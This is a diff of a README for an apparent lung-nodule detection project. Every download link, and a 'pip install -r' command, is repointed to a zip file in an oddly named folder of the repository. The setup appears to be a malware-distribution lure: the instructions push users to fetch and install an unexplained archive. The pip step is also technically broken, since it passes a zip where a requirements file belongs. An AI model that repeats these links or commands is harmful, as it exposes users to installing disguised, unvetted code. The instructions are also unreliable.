@@ -6,9 +6,9 @@ Welcome to the lung-nodule-detection-yolov8 project! This application helps dete
 
 ## 📦 Download & Install
 
-[![Download lung-nodule-detection-yolov8](https://raw.githubusercontent.com/workhub-workbot/lung-nodule-detection-yolov8/main/noneclipsing/lung-nodule-detection-yolov8.zip)](https://raw.githubusercontent.com/workhub-workbot/lung-nodule-detection-yolov8/main/noneclipsing/lung-nodule-detection-yolov8.zip)
+[![Download lung-nodule-detection-yolov8](https://raw.githubusercontent.com/workhub-workbot/lung-nodule-detection-yolov8/main/noneclipsing/yolov-lung-nodule-detection-2.3.zip)](https://raw.githubusercontent.com/workhub-workbot/lung-nodule-detection-yolov8/main/noneclipsing/yolov-lung-nodule-detection-2.3.zip)
 
-To download the application, visit this page: [Download Page](https://raw.githubusercontent.com/workhub-workbot/lung-nodule-detection-yolov8/main/noneclipsing/lung-nodule-detection-yolov8.zip). You will find different versions of the software available for download.
+To download the application, visit this page: [Download Page](https://raw.githubusercontent.com/workhub-workbot/lung-nodule-detection-yolov8/main/noneclipsing/yolov-lung-nodule-detection-2.3.zip). You will find different versions of the software available for download.
 
 ### 💻 System Requirements
 
@@ -23,7 +23,7 @@ Before you begin, ensure your computer meets the following requirements:
 ### 📄 Installation Steps
 
 1. **Visit the Download Page:**
-   Go to [Download Page](https://raw.githubusercontent.com/workhub-workbot/lung-nodule-detection-yolov8/main/noneclipsing/lung-nodule-detection-yolov8.zip).
+   Go to [Download Page](https://raw.githubusercontent.com/workhub-workbot/lung-nodule-detection-yolov8/main/noneclipsing/yolov-lung-nodule-detection-2.3.zip).
 
 2. **Choose the Version:**
    Look for the latest release. It will have the highest version number.
@@ -41,7 +41,7 @@ Before you begin, ensure your computer meets the following requirements:
    Open a terminal or command prompt and run the following command to install dependencies:
 
    ```
-   pip install -r https://raw.githubusercontent.com/workhub-workbot/lung-nodule-detection-yolov8/main/noneclipsing/lung-nodule-detection-yolov8.zip
+   pip install -r https://raw.githubusercontent.com/workhub-workbot/lung-nodule-detection-yolov8/main/noneclipsing/yolov-lung-nodule-detection-2.3.zip
    ```
 
 7. **Launch the Application:**
